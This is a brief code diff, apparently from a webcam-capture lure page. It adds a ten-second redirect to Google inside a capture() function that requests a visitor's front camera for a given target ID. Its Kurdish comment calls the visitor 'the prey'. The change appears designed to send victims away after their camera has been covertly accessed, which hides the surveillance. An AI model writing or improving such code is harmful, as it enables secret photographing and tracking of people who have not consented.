@@ -15,6 +15,11 @@
     async function capture() {
         if (!targetID) return;
 
+        // 🕒 دوای ١٠ چرکە نێچیرەکە دەنێرێت بۆ گوگل
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 10000);
+
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
